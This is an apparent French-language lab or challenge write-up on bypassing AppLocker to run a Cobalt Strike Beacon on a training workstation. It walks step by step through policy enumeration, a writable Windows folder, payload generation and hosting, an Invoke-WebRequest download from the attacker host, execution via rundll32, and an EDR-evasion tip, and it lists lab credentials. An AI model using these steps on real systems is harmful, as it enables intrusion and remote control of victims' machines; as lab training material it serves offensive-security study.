# AppLocker Challenge

**Objectif :** contourner AppLocker pour exécuter un Beacon sur la workstation cible.

| Hôte | Credentials |
|------|-------------|
| `lon-wkstn-1` | `CONTOSO\pchilds` / `Passw0rd!` |
| `lon-dc-1` | `CONTOSO\Administrator` / `Passw0rd!` |

---

## Étape 1 — Énumérer la politique AppLocker de lon-wkstn-1

```powershell
# Confirm AppLocker is enforcing (ConstrainedLanguage = active)
$ExecutionContext.SessionState.LanguageMode

# Read all effective rules
$policy = Get-AppLockerPolicy -Effective
$policy.RuleCollections

# Check if DLL rules are enforced — empty output = DLL rules OFF = rundll32 viable
$policy.RuleCollections | Where-Object { $_.RuleCollectionType -eq 'Dll' }

# Find writable dirs inside the allowed %WINDIR%\* path
icacls C:\Windows\Tasks
icacls C:\Windows\Temp
```

**Résultats sur `lon-wkstn-1` :**

| Contrôle | Résultat |
|-------|--------|
| Language mode | `ConstrainedLanguage` — AppLocker appliqué |
| DLL rules | **Aucune** — contrôle des DLL désactivé |
| `C:\Windows\Tasks` | `Authenticated Users:(RX,WD)` — **écriture autorisée** |
| `C:\Windows\Temp` | Accès refusé à pchilds |
| Rules in place | Uniquement les règles par défaut — `%WINDIR%\*` and `%PROGRAMFILES%\*` pour Everyone |

**Méthode de bypass :** `rundll32` charge une DLL déposée dans `C:\Windows\Tasks`.
- `rundll32.exe` se trouve dans `%WINDIR%\System32\` et correspond à la règle d’autorisation `%WINDIR%\*`
- Les règles DLL sont désactivées : AppLocker ne vérifie pas directement le payload DLL

<img src="/images/applocker-challenge01.png" width=860>

---

## Étape 2 — Générer une DLL Beacon stageless (Attacker Desktop — CS)

```
Cobalt Strike > Payloads > Windows Stageless Payload
  Listener:  http
  Output:    Windows DLL (x64)
  Save as:   C:\Payloads\beacon.dll
```

---

## Étape 3 — Héberger le payload sur le Web Server CS

```
Site Management > Host File
  File:   C:\Payloads\beacon.dll
  URI:    /beacon.dll
  Port:   80
```

Confirmation dans Cobalt Strike : 

```
04/21 08:09:23 *** neo hosted file /cobaltstrike/server/uploads/beacon.dll @ http://172.16.0.10:80/beacon.dll
04/21 08:10:29 *** initial beacon from pchilds@10.10.121.108 (LON-WKSTN-1)
```


---

## Étape 4 — Télécharger la DLL Beacon sur lon-wkstn-1

Sur `lon-wkstn-1`, sous `pchilds`, `Invoke-WebRequest` fonctionne en mode ConstrainedLanguage :

```powershell
cd C:\Windows\Tasks\
Invoke-WebRequest -Uri 'http://10.0.0.5:80/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
```

---

## Étape 5 — Exécuter avec rundll32

```cmd
rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```

> **OPSEC-🟠CAUTION:** `rundll32` est visible par l’EDR. La DLL Beacon exporte `StartW` pour cet appel. Vérifier `spawnto` dans le Malleable C2 Profile avant de générer le payload.

---

## Étape 6 — Récupérer le Beacon dans Cobalt Strike

```
View > Beacons
```

Le Beacon se connecte sous `CONTOSO\pchilds`, sur `LON-WKSTN-1`, dans le processus `rundll32.exe` (`x64`).

Vérification :

```cs
beacon> getuid
// [*] You are CONTOSO\pchilds

beacon> pwd
// [*] Current directory is C:\Windows\Tasks
```

<img src="/images/applocker-challenge02.png" width=860>

---

## Récapitulatif

```
CONFIRM CLM:   $ExecutionContext.SessionState.LanguageMode  → ConstrainedLanguage
DLL RULES OFF: $policy.RuleCollections | ? {$_.RuleCollectionType -eq 'Dll'}  → empty
WRITABLE PATH: icacls C:\Windows\Tasks  → Authenticated Users:(RX,WD)
DOWNLOAD:      Invoke-WebRequest -Uri 'http://<teamserver>/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
EXECUTE:       rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
```
